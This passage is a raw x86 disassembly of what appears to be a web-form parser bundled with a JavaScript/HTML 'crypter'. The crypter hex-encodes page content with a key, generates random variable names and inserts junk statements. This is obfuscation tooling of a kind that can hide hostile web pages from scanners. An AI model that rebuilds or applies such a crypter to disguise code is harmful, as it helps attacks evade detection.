call   8048e0c <realloc@plt>
mov    ebx,eax
mov    eax,DWORD PTR [ebp+0x8]
mov    edx,DWORD PTR [eax+0x4]
mov    DWORD PTR [ebx+edx*8],esi
mov    DWORD PTR [eax],ebx
pop    ecx
push   DWORD PTR [ebp-0x10]
mov    DWORD PTR [ebp-0x14],edx
call   804dbd4 <urldecode>
mov    edx,DWORD PTR [ebp-0x14]
mov    DWORD PTR [ebx+edx*8+0x4],eax
mov    eax,DWORD PTR [ebp+0x8]
inc    DWORD PTR [eax+0x4]
pop    edx
jmp    804aa60 <cookie_parse+0x98>
push   edx
push   0x0
push   0x804e78b
push   0x6
call   804a860 <seterror>
xor    eax,eax
jmp    804aa85 <cookie_parse+0xbd>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    esi,DWORD PTR [ebp+0x8]
test   esi,esi
mov    edi,DWORD PTR [ebp+0xc]
je     804ab37 <form_get_value+0x53>
test   edi,edi
je     804ab37 <form_get_value+0x53>
mov    eax,DWORD PTR [esi+0x4]
xor    ebx,ebx
test   eax,eax
je     804ab1f <form_get_value+0x3b>
sub    esp,0x8
push   edi
mov    eax,DWORD PTR [esi]
push   DWORD PTR [eax+ebx*8]
call   804d374 <stricmp>
add    esp,0x10
test   eax,eax
je     804ab29 <form_get_value+0x45>
inc    ebx
cmp    DWORD PTR [esi+0x4],ebx
ja     804ab04 <form_get_value+0x20>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
mov    eax,DWORD PTR [esi]
mov    eax,DWORD PTR [eax+ebx*8+0x4]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
push   edi
push   esi
push   0x804e7a0
push   0x6
call   804a860 <seterror>
jmp    804ab1f <form_get_value+0x3b>
nop
push   ebp
mov    ebp,esp
push   esi
mov    esi,DWORD PTR [ebp+0x8]
test   esi,esi
push   ebx
je     804abdf <form_free+0x97>
mov    eax,DWORD PTR [esi+0x4]
xor    ebx,ebx
test   eax,eax
je     804abc4 <form_free+0x7c>
mov    edx,DWORD PTR [esi]
jmp    804ab76 <form_free+0x2e>
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [edx+ebx*8+0x4]
test   eax,eax
jne    804ab9c <form_free+0x54>
inc    ebx
cmp    DWORD PTR [esi+0x4],ebx
jbe    804abb8 <form_free+0x70>
mov    eax,DWORD PTR [edx+ebx*8]
test   eax,eax
je     804ab68 <form_free+0x20>
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
mov    edx,DWORD PTR [esi]
mov    eax,DWORD PTR [edx+ebx*8+0x4]
add    esp,0x10
test   eax,eax
mov    DWORD PTR [edx+ebx*8],0x0
je     804ab70 <form_free+0x28>
mov    esi,esi
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
mov    edx,DWORD PTR [esi]
mov    DWORD PTR [edx+ebx*8+0x4],0x0
inc    ebx
add    esp,0x10
cmp    DWORD PTR [esi+0x4],ebx
ja     804ab76 <form_free+0x2e>
test   ebx,ebx
je     804abc4 <form_free+0x7c>
mov    eax,DWORD PTR [esi]
test   eax,eax
jne    804abcb <form_free+0x83>
mov    esi,esi
lea    esp,[ebp-0x8]
pop    ebx
pop    esi
leave  
ret    
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
add    esp,0x10
mov    DWORD PTR [esi],0x0
jmp    804abc4 <form_free+0x7c>
push   eax
push   0x0
push   0x804e7b7
push   0x6
call   804a860 <seterror>
jmp    804abc4 <form_free+0x7c>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x1c
mov    edx,DWORD PTR [ebp+0x8]
test   edx,edx
mov    eax,DWORD PTR [ebp+0xc]
mov    ebx,DWORD PTR [ebp+0x10]
mov    esi,DWORD PTR [ebp+0x14]
mov    DWORD PTR [ebp-0x10],0x0
mov    DWORD PTR [ebp-0x14],0x0
je     804ad54 <form_parse+0x164>
test   eax,eax
je     804ad54 <form_parse+0x164>
test   ebx,ebx
je     804ad54 <form_parse+0x164>
mov    edx,DWORD PTR [ebp+0x8]
test   esi,esi
mov    DWORD PTR [edx],0x0
mov    DWORD PTR [edx+0x4],0x0
jne    804ad73 <form_parse+0x183>
test   ebx,ebx
je     804ac5e <form_parse+0x6e>
xor    eax,eax
cld    
mov    ecx,0xffffffff
mov    edi,ebx
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    eax,ecx
dec    eax
jne    804aded <form_parse+0x1fd>
mov    eax,DWORD PTR [ebp-0x10]
test   eax,eax
je     804ade0 <form_parse+0x1f0>
mov    ebx,DWORD PTR [ebp-0x10]
jmp    804aca0 <form_parse+0xb0>
mov    esi,esi
test   edi,edi
je     804ac80 <form_parse+0x90>
sub    esp,0xc
push   edi
call   8048f8c <free@plt>
add    esp,0x10
mov    edx,DWORD PTR [ebp-0x18]
test   edx,edx
je     804ac95 <form_parse+0xa5>
sub    esp,0xc
push   DWORD PTR [ebp-0x18]
call   8048f8c <free@plt>
add    esp,0x10
test   esi,esi
lea    ebx,[esi+0x1]
je     804ade0 <form_parse+0x1f0>
sub    esp,0x8
push   0x26
push   ebx
call   8048f5c <strchr@plt>
add    esp,0x10
test   eax,eax
mov    esi,eax
je     804acb7 <form_parse+0xc7>
mov    BYTE PTR [eax],0x0
push   eax
push   0x0
push   0x3d
push   ebx
call   804db44 <strsplit>
add    esp,0x10
test   eax,eax
mov    edi,eax
je     804ac95 <form_parse+0xa5>
push   eax
push   0x1
push   0x3d
push   ebx
call   804db44 <strsplit>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x18],eax
je     804ac70 <form_parse+0x80>
cmp    BYTE PTR [eax],0x0
je     804ac70 <form_parse+0x80>
mov    ecx,DWORD PTR [ebp+0x8]
mov    eax,DWORD PTR [ecx+0x4]
sub    esp,0x8
lea    eax,[eax*8+0x8]
push   eax
push   DWORD PTR [ecx]
call   804da74 <xrealloc>
mov    edx,DWORD PTR [ebp+0x8]
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x1c],eax
mov    DWORD PTR [edx],eax
je     804ae3f <form_parse+0x24f>
mov    ecx,DWORD PTR [ebp+0x8]
mov    ebx,DWORD PTR [ecx+0x4]
sub    esp,0xc
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [eax+ebx*8],edi
push   DWORD PTR [ebp-0x18]
call   804dbd4 <urldecode>
mov    edx,DWORD PTR [ebp-0x1c]
mov    ecx,DWORD PTR [ebp+0x8]
mov    DWORD PTR [edx+ebx*8+0x4],eax
mov    edx,DWORD PTR [ecx+0x4]
mov    eax,DWORD PTR [ecx]
mov    ebx,DWORD PTR [eax+edx*8+0x4]
add    esp,0x10
test   ebx,ebx
je     804ae3f <form_parse+0x24f>
lea    eax,[edx+0x1]
mov    edx,DWORD PTR [ebp+0x8]
mov    DWORD PTR [edx+0x4],eax
jmp    804ac87 <form_parse+0x97>
nop
sub    esp,0x8
push   esi
push   ebx
push   eax
push   DWORD PTR [ebp+0x8]
push   0x804e7c9
push   0x6
call   804a860 <seterror>
xor    eax,eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
sub    esp,0x8
push   0x804e7e4
push   eax
call   804d374 <stricmp>
add    esp,0x10
test   eax,eax
jne    804ac43 <form_parse+0x53>
sub    esp,0xc
lea    eax,[esi+0x1]
push   eax
call   804d878 <xmalloc>
mov    DWORD PTR [ebp-0x10],eax
mov    edi,DWORD PTR [ebp-0x10]
add    esp,0x10
xor    eax,eax
test   edi,edi
je     804ad6b <form_parse+0x17b>
push   DWORD PTR ds:0x8055924
push   esi
push   0x1
push   DWORD PTR [ebp-0x10]
call   8048e2c <fread@plt>
add    esp,0x10
cmp    eax,esi
je     804ae64 <form_parse+0x274>
sub    esp,0xc
push   DWORD PTR [ebp-0x10]
call   8048f8c <free@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x10],0x0
jmp    804ac43 <form_parse+0x53>
lea    esi,[esi+0x0]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    eax,0x1
pop    edi
leave  
ret    
mov    edx,DWORD PTR [ebp-0x14]
sub    esp,0x8
lea    eax,[edx+eax*1+0x1]
push   eax
push   DWORD PTR [ebp-0x10]
call   804da74 <xrealloc>
mov    DWORD PTR [ebp-0x10],eax
mov    ecx,DWORD PTR [ebp-0x10]
add    esp,0x10
xor    eax,eax
test   ecx,ecx
je     804ad6b <form_parse+0x17b>
push   ebx
mov    edx,DWORD PTR [ebp-0x14]
test   edx,edx
mov    eax,0x804e7e9
jne    804ae25 <form_parse+0x235>
mov    eax,0x804e01f
push   eax
push   0x804e2e6
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048edc <sprintf@plt>
add    esp,0x10
jmp    804ac5e <form_parse+0x6e>
mov    ecx,DWORD PTR [ebp-0x10]
test   ecx,ecx
je     804ae54 <form_parse+0x264>
sub    esp,0xc
push   DWORD PTR [ebp-0x10]
call   8048f8c <free@plt>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp+0x8]
call   804ab48 <form_free>
jmp    804ad69 <form_parse+0x179>
mov    ecx,DWORD PTR [ebp-0x10]
mov    BYTE PTR [ecx+esi*1],0x0
mov    DWORD PTR [ebp-0x14],esi
jmp    804ac43 <form_parse+0x53>
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
xor    ecx,ecx
mov    ebx,DWORD PTR [ebp+0x10]
cmp    ecx,ebx
jae    804aeaa <js_convert+0x36>
cld    
xor    esi,esi
mov    edx,DWORD PTR [ebp+0xc]
lea    esi,[esi+0x0]
mov    edi,DWORD PTR [ebp+0x8]
mov    al,BYTE PTR [edi+ecx*1]
mov    edi,DWORD PTR [ebp+0xc]
mov    BYTE PTR [edi+ecx*4],al
lea    edi,[edx+0x1]
mov    eax,esi
inc    ecx
stos   WORD PTR es:[edi],ax
add    edx,0x4
mov    eax,esi
cmp    ecx,ebx
stos   BYTE PTR es:[edi],al
jb     804ae8c <js_convert+0x18>
mov    eax,ebx
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x2c
cld    
lea    edi,[ebp-0x38]
mov    esi,0x804ed34
mov    ecx,0x4
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
mov    ecx,DWORD PTR [ebp+0x8]
xor    ebx,ebx
test   ecx,ecx
mov    eax,DWORD PTR [ebp+0x10]
je     804af38 <js_crypter_str_to_hex+0x84>
mov    edx,DWORD PTR [ebp+0xc]
test   edx,edx
je     804af38 <js_crypter_str_to_hex+0x84>
test   eax,eax
mov    esi,eax
je     804af6d <js_crypter_str_to_hex+0xb9>
xor    eax,eax
test   esi,esi
je     804af50 <js_crypter_str_to_hex+0x9c>
xor    edi,edi
cmp    edi,DWORD PTR [ebp+0xc]
jae    804af2c <js_crypter_str_to_hex+0x78>
mov    edx,DWORD PTR [ebp+0x8]
mov    al,BYTE PTR [edx+edi*1]
sar    al,0x4
and    eax,0xf
mov    al,BYTE PTR [ebp+eax*1-0x38]
mov    BYTE PTR [esi+ebx*1],al
movsx  eax,BYTE PTR [edx+edi*1]
and    eax,0xf
mov    al,BYTE PTR [ebp+eax*1-0x38]
mov    BYTE PTR [esi+ebx*1+0x1],al
call   8048c4c <random@plt>
test   al,0x1
jne    804af58 <js_crypter_str_to_hex+0xa4>
add    ebx,0x2
inc    edi
cmp    edi,DWORD PTR [ebp+0xc]
jb     804aef8 <js_crypter_str_to_hex+0x44>
lea    esp,[ebp-0xc]
pop    ebx
mov    eax,esi
pop    esi
pop    edi
leave  
ret    
mov    esi,esi
sub    esp,0xc
push   eax
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
push   0x804edf0
push   0x6
call   804a860 <seterror>
xor    eax,eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
sub    esp,0xc
lea    eax,[esi+ebx*1]
push   eax
call   804d588 <upcase>
add    ebx,0x2
add    esp,0x10
inc    edi
jmp    804af27 <js_crypter_str_to_hex+0x73>
sub    esp,0x8
push   0x3
push   DWORD PTR [ebp+0xc]
call   804dab0 <xcalloc>
mov    esi,eax
add    esp,0x10
jmp    804aeeb <js_crypter_str_to_hex+0x37>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0x8]
xor    ebx,ebx
test   eax,eax
mov    edi,DWORD PTR [ebp+0x10]
mov    esi,DWORD PTR [ebp+0x14]
je     804afa7 <js_crypter_alg+0x23>
mov    ecx,DWORD PTR [ebp+0xc]
test   ecx,ecx
je     804afa7 <js_crypter_alg+0x23>
test   edi,edi
jne    804afc8 <js_crypter_alg+0x44>
sub    esp,0x8
push   esi
push   edi
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
push   0x804ee14
push   0x6
call   804a860 <seterror>
xor    eax,eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
test   esi,esi
je     804afa7 <js_crypter_alg+0x23>
sub    esp,0xc
lea    eax,[edi+0x1]
push   eax
call   804d878 <xmalloc>
mov    DWORD PTR [ebp-0x10],eax
mov    edx,DWORD PTR [ebp-0x10]
add    esp,0x10
xor    eax,eax
test   edx,edx
je     804afc0 <js_crypter_alg+0x3c>
xor    edx,edx
cmp    edx,edi
jae    804b014 <js_crypter_alg+0x90>
lea    ecx,[esi-0x1]
jmp    804affa <js_crypter_alg+0x76>
mov    esi,esi
inc    ebx
inc    edx
cmp    edx,edi
jae    804b014 <js_crypter_alg+0x90>
mov    esi,DWORD PTR [ebp+0xc]
mov    al,BYTE PTR [esi+ebx*1]
mov    esi,DWORD PTR [ebp+0x8]
add    al,BYTE PTR [esi+edx*1]
mov    esi,DWORD PTR [ebp-0x10]
cmp    ecx,ebx
mov    BYTE PTR [esi+edx*1],al
ja     804aff4 <js_crypter_alg+0x70>
xor    ebx,ebx
jmp    804aff5 <js_crypter_alg+0x71>
push   eax
push   0x0
push   edi
push   DWORD PTR [ebp-0x10]
call   804aeb4 <js_crypter_str_to_hex>
mov    esi,DWORD PTR [ebp-0x10]
add    esp,0x10
test   esi,esi
mov    ebx,eax
je     804b03a <js_crypter_alg+0xb6>
sub    esp,0xc
push   DWORD PTR [ebp-0x10]
call   8048f8c <free@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
mov    eax,ebx
pop    ebx
pop    esi
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x3c
mov    ebx,DWORD PTR [ebp+0x8]
xor    esi,esi
cmp    ebx,0x1e
ja     804b114 <js_crypter_rand_hex+0xd0>
sub    esp,0x8
mov    BYTE PTR [ebp+ebx*1-0x38],0x0
push   0x0
push   0x804ed45
call   8048f4c <open@plt>
add    esp,0x10
cmp    eax,0xffffffff
mov    edi,eax
je     804b0d0 <js_crypter_rand_hex+0x8c>
push   eax
push   ebx
lea    eax,[ebp-0x38]
push   eax
push   edi
call   8048ddc <read@plt>
add    esp,0x10
cmp    eax,ebx
je     804b091 <js_crypter_rand_hex+0x4d>
mov    esi,0x1
sub    esp,0xc
push   edi
call   8048f7c <close@plt>
mov    eax,esi
add    esp,0x10
dec    al
je     804b0d0 <js_crypter_rand_hex+0x8c>
nop
xor    eax,eax
cld    
mov    edi,0x8055960
mov    ecx,0xf
rep stos DWORD PTR es:[edi],eax
stos   WORD PTR es:[edi],ax
stos   BYTE PTR es:[edi],al
push   eax
push   0x8055960
push   ebx
lea    eax,[ebp-0x38]
push   eax
call   804aeb4 <js_crypter_str_to_hex>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
mov    esi,esi
xor    edi,edi
cmp    edi,ebx
jge    804b0a4 <js_crypter_rand_hex+0x60>
mov    esi,esi
call   8048dcc <rand@plt>
push   eax
fild   DWORD PTR [esp]
fnstcw WORD PTR [ebp-0x3a]
mov    ax,WORD PTR [ebp-0x3a]
fmul   DWORD PTR ds:0x804ee8c
mov    ah,0xc
mov    WORD PTR [ebp-0x3c],ax
fmul   DWORD PTR ds:0x804ee90
fldcw  WORD PTR [ebp-0x3c]
fistp  DWORD PTR [ebp-0x40]
fldcw  WORD PTR [ebp-0x3a]
mov    eax,DWORD PTR [ebp-0x40]
mov    BYTE PTR [ebp+edi*1-0x38],al
add    esp,0x4
inc    edi
cmp    edi,ebx
jl     804b0d8 <js_crypter_rand_hex+0x94>
jmp    804b0a4 <js_crypter_rand_hex+0x60>
push   eax
push   ebx
push   0x804ee34
push   0x6
call   804a860 <seterror>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    ebx,DWORD PTR [ebp+0x8]
test   ebx,ebx
je     804b1e3 <js_crypter_validate+0xb7>
mov    ecx,DWORD PTR [ebp+0xc]
test   ecx,ecx
je     804b1bd <js_crypter_validate+0x91>
mov    eax,DWORD PTR [ebp+0xc]
sub    esp,0xc
inc    eax
push   eax
call   804d878 <xmalloc>
mov    DWORD PTR [ebp-0x10],eax
mov    edx,DWORD PTR [ebp-0x10]
add    esp,0x10
xor    eax,eax
test   edx,edx
je     804b1a7 <js_crypter_validate+0x7b>
xor    esi,esi
xor    edi,edi
cmp    esi,DWORD PTR [ebp+0xc]
jae    804b19d <js_crypter_validate+0x71>
mov    eax,DWORD PTR [ebp+0x8]
mov    bl,BYTE PTR [eax+edi*1]
movsx  edx,bl
cmp    edx,0xff
jbe    804b1d8 <js_crypter_validate+0xac>
sub    esp,0xc
push   edx
call   8048dec <___runetype@plt>
add    esp,0x10
and    eax,0x500
test   eax,eax
jne    804b1b0 <js_crypter_validate+0x84>
cmp    bl,0x5f
je     804b1b0 <js_crypter_validate+0x84>
inc    edi
cmp    edi,DWORD PTR [ebp+0xc]
jb     804b16c <js_crypter_validate+0x40>
mov    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [eax+esi*1],0x0
mov    eax,DWORD PTR [ebp-0x10]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
mov    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [eax+esi*1],bl
inc    edi
inc    esi
cmp    edi,DWORD PTR [ebp+0xc]
jmp    804b19b <js_crypter_validate+0x6f>
cld    
mov    ecx,0xffffffff
xor    eax,eax
mov    edi,DWORD PTR [ebp+0x8]
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
mov    DWORD PTR [ebp+0xc],ecx
jmp    804b147 <js_crypter_validate+0x1b>
lea    esi,[esi+0x0]
mov    eax,ds:0x8055928
mov    eax,DWORD PTR [eax+edx*4+0x34]
jmp    804b189 <js_crypter_validate+0x5d>
push   DWORD PTR [ebp+0xc]
push   0x0
push   0x804ed52
push   0x6
call   804a860 <seterror>
xor    eax,eax
jmp    804b1a7 <js_crypter_validate+0x7b>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    DWORD PTR [ebp-0x10],0x80561e0
mov    DWORD PTR [ebp-0x14],0x0
jmp    804b283 <js_crypter_make_vars+0x8b>
lea    esi,[esi+0x0]
and    edx,0xfffffffc
sub    eax,edx
lea    edi,[eax+0x5]
call   8048c4c <random@plt>
cdq    
mov    ecx,0x16
idiv   ecx
mov    esi,edx
lea    ebx,[edx+0x41]
call   8048c4c <random@plt>
test   al,0x1
mov    edx,ebx
je     804b23c <js_crypter_make_vars+0x44>
lea    edx,[esi+0x61]
sub    esp,0xc
mov    eax,DWORD PTR [ebp-0x14]
push   edi
mov    BYTE PTR [eax+0x80561e0],dl
call   804b044 <js_crypter_rand_hex>
add    esp,0x10
test   eax,eax
je     804b299 <js_crypter_make_vars+0xa1>
sub    esp,0x8
push   0xa000
push   0x9
call   804d8b0 <strrand>
pop    esi
pop    edi
push   eax
push   DWORD PTR [ebp-0x10]
call   8048c0c <strcpy@plt>
add    DWORD PTR [ebp-0x10],0x20
add    esp,0x10
add    DWORD PTR [ebp-0x14],0x20
cmp    DWORD PTR [ebp-0x10],0x8056420
ja     804b294 <js_crypter_make_vars+0x9c>
call   8048c4c <random@plt>
test   eax,eax
mov    edx,eax
jns    804b214 <js_crypter_make_vars+0x1c>
lea    edx,[eax+0x3]
jmp    804b214 <js_crypter_make_vars+0x1c>
nop
mov    eax,0x1
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x12c
call   8048c4c <random@plt>
sub    esp,0xc
push   0x100
call   804d878 <xmalloc>
mov    BYTE PTR [eax],0x0
add    esp,0x10
cmp    DWORD PTR ds:0x8056440,0xf
mov    esi,eax
ja     804b3b0 <js_randomizer+0x10c>
sub    esp,0xc
push   0x5
call   804b044 <js_crypter_rand_hex>
mov    edi,eax
call   8048c4c <random@plt>
cdq    
mov    ecx,0x16
idiv   ecx
mov    DWORD PTR [ebp-0x11c],edx
add    esp,0x10
mov    ebx,edx
call   8048c4c <random@plt>
add    ebx,0x41
test   al,0x1
mov    edx,ebx
jne    804b444 <js_randomizer+0x1a0>
sub    esp,0x8
mov    BYTE PTR [edi],dl
lea    ecx,[ebp-0x118]
push   edi
push   ecx
call   8048c0c <strcpy@plt>
call   8048c4c <random@plt>
test   eax,eax
mov    edx,eax
js     804b46e <js_randomizer+0x1ca>
and    edx,0xfffffc00
sub    eax,edx
push   eax
lea    eax,[ebp-0x118]
push   eax
push   0x804ed6e
push   esi
call   8048edc <sprintf@plt>
add    esp,0x18
lea    edx,[ebp-0x118]
push   edx
mov    eax,ds:0x8056440
shl    eax,0x5
add    eax,0x8055fe0
push   eax
call   8048c0c <strcpy@plt>
mov    edi,DWORD PTR ds:0x8056440
inc    edi
add    esp,0x10
cmp    edi,0x1
mov    DWORD PTR ds:0x8056440,edi
ja     804b3eb <js_randomizer+0x147>
nop
sub    esp,0x8
lea    eax,[ebp-0x118]
push   eax
push   esi
call   8048d8c <strcat@plt>
call   8048c4c <random@plt>
mov    edx,0x5
mov    ecx,edx
cdq    
idiv   ecx
add    esp,0x10
cmp    edx,0x4
ja     804b4a7 <js_randomizer+0x203>
jmp    DWORD PTR [edx*4+0x804ed0c]
mov    esi,esi
call   8048c4c <random@plt>
test   eax,eax
mov    edx,eax
js     804b524 <js_randomizer+0x280>
and    edx,0xfffffff0
sub    eax,edx
shl    eax,0x5
sub    esp,0x8
lea    edi,[eax+0x8055fe0]
push   edi
lea    ecx,[ebp-0x118]
push   ecx
call   8048c0c <strcpy@plt>
mov    edi,DWORD PTR ds:0x8056440
add    esp,0x10
cmp    edi,0x1
jbe    804b37c <js_randomizer+0xd8>
xor    edx,edx
mov    ecx,0x3
mov    eax,edi
div    ecx
xor    ebx,ebx
cmp    ebx,edx
mov    DWORD PTR [ebp-0x120],edx
jae    804b37c <js_randomizer+0xd8>
cmp    ebx,edi
jae    804b37c <js_randomizer+0xd8>
mov    eax,ebx
shl    eax,0x5
sub    esp,0x8
add    eax,0x8055fe0
push   eax
push   esi
call   8048d8c <strcat@plt>
call   8048c4c <random@plt>
mov    edx,0x5
mov    ecx,edx
cdq    
idiv   ecx
add    esp,0x10
cmp    edx,0x4
ja     804b4f7 <js_randomizer+0x253>
jmp    DWORD PTR [edx*4+0x804ed20]
mov    edx,DWORD PTR [ebp-0x11c]
add    edx,0x61
sub    esp,0x8
mov    BYTE PTR [edi],dl
lea    ecx,[ebp-0x118]
push   edi
push   ecx
call   8048c0c <strcpy@plt>
call   8048c4c <random@plt>
test   eax,eax
mov    edx,eax
jns    804b32e <js_randomizer+0x8a>
lea    edx,[eax+0x3ff]
jmp    804b32e <js_randomizer+0x8a>
sub    esp,0xc
push   0x5
call   804b044 <js_crypter_rand_hex>
add    esp,0xc
push   eax
push   0x804ed7c
cld    
xor    eax,eax
mov    ecx,0xffffffff
mov    edi,esi
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    ecx,[ecx+esi*1-0x1]
push   ecx
call   8048edc <sprintf@plt>
add    esp,0x10
mov    edi,esi
xor    eax,eax
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    WORD PTR [ecx+esi*1-0x1],0x3b
lea    esp,[ebp-0xc]
pop    ebx
mov    eax,esi
pop    esi
pop    edi
leave  
ret    
sub    esp,0xc
push   0x5
call   804b044 <js_crypter_rand_hex>
add    esp,0xc
push   eax
push   0x804ed7c
lea    esi,[esi+0x0]
cld    
xor    eax,eax
mov    ecx,0xffffffff
mov    edi,esi
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    ecx,[ecx+esi*1-0x1]
push   ecx
call   8048edc <sprintf@plt>
add    esp,0x10
xor    eax,eax
cld    
mov    ecx,0xffffffff
mov    edi,esi
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    WORD PTR [ecx+esi*1-0x1],0x3b
inc    ebx
cmp    ebx,DWORD PTR [ebp-0x120]
jae    804b37c <js_randomizer+0xd8>
cmp    ebx,DWORD PTR ds:0x8056440
jmp    804b408 <js_randomizer+0x164>
lea    edx,[eax+0xf]
jmp    804b3bf <js_randomizer+0x11b>
sub    esp,0x10
call   8048c4c <random@plt>
add    esp,0xc
test   eax,eax
mov    edx,eax
js     804b668 <js_randomizer+0x3c4>
and    edx,0xfffffc00
sub    eax,edx
push   eax
push   0x804ed82
jmp    804b48c <js_randomizer+0x1e8>
sub    esp,0x10
call   8048c4c <random@plt>
add    esp,0xc
test   eax,eax
mov    edx,eax
js     804b673 <js_randomizer+0x3cf>
and    edx,0xfffffc00
sub    eax,edx
push   eax
push   0x804ed88
jmp    804b48c <js_randomizer+0x1e8>
sub    esp,0xc
push   0x5
call   804b044 <js_crypter_rand_hex>
add    esp,0xc
push   eax
push   0x804ed8e
jmp    804b48c <js_randomizer+0x1e8>
mov    edi,esi
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
mov    DWORD PTR [esi+ecx*1],0x536f742e
mov    DWORD PTR [esi+ecx*1+0x4],0x6e697274
mov    DWORD PTR [esi+ecx*1+0x8],0x292867
mov    edi,esi
xor    eax,eax
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    WORD PTR [ecx+esi*1-0x1],0x3b
lea    esp,[ebp-0xc]
pop    ebx
mov    eax,esi
pop    esi
pop    edi
leave  
ret    
sub    esp,0x10
call   8048c4c <random@plt>
add    esp,0xc
test   eax,eax
mov    edx,eax
js     804b686 <js_randomizer+0x3e2>
and    edx,0xfffffc00
sub    eax,edx
push   eax
push   0x804ed82
jmp    804b4dc <js_randomizer+0x238>
cld    
mov    ecx,0xffffffff
xor    eax,eax
mov    edi,esi
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
mov    DWORD PTR [esi+ecx*1],0x536f742e
mov    DWORD PTR [esi+ecx*1+0x4],0x6e697274
mov    DWORD PTR [esi+ecx*1+0x8],0x292867
jmp    804b4f7 <js_randomizer+0x253>
sub    esp,0x10
call   8048c4c <random@plt>
add    esp,0xc
test   eax,eax
mov    edx,eax
js     804b67e <js_randomizer+0x3da>
and    edx,0xfffffc00
sub    eax,edx
push   eax
push   0x804ed88
jmp    804b4dc <js_randomizer+0x238>
sub    esp,0xc
push   0x5
call   804b044 <js_crypter_rand_hex>
add    esp,0xc
push   eax
push   0x804ed8e
jmp    804b4dc <js_randomizer+0x238>
lea    edx,[eax+0x3ff]
jmp    804b541 <js_randomizer+0x29d>
lea    edx,[eax+0x3ff]
jmp    804b569 <js_randomizer+0x2c5>
lea    edx,[eax+0x3ff]
jmp    804b63d <js_randomizer+0x399>
lea    edx,[eax+0x3ff]
jmp    804b5ee <js_randomizer+0x34a>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x2c
mov    ebx,DWORD PTR [ebp+0x8]
xor    esi,esi
test   ebx,ebx
mov    DWORD PTR [ebp-0x30],0x0
je     804b7a0 <js_crypter_html_to_wchar+0x10c>
mov    edi,DWORD PTR [ebp+0xc]
test   edi,edi
je     804b7a0 <js_crypter_html_to_wchar+0x10c>
mov    ecx,DWORD PTR [ebp+0x10]
test   ecx,ecx
je     804b7a0 <js_crypter_html_to_wchar+0x10c>
mov    edx,DWORD PTR [ebp+0xc]
sub    esp,0xc
lea    eax,[edx*4+0x1]
push   eax
call   804d878 <xmalloc>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x34],eax
je     804b7b6 <js_crypter_html_to_wchar+0x122>
mov    DWORD PTR [eax],0x0
push   DWORD PTR [ebp+0xc]
push   eax
push   ebx
call   804ae74 <js_convert>
add    esp,0xc
inc    eax
je     804b7c0 <js_crypter_html_to_wchar+0x12c>
cmp    esi,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x2c],0x0
jmp    804b77d <js_crypter_html_to_wchar+0xe9>
mov    esi,esi
mov    ecx,DWORD PTR [ebp-0x2c]
mov    edx,DWORD PTR [ebp-0x34]
mov    eax,DWORD PTR [edx+ecx*4]
test   eax,eax
je     804b77f <js_crypter_html_to_wchar+0xeb>
push   edx
push   eax
push   0x804eda8
lea    ecx,[ebp-0x28]
push   ecx
call   8048edc <sprintf@plt>
lea    edi,[ebp-0x28]
xor    eax,eax
cld    
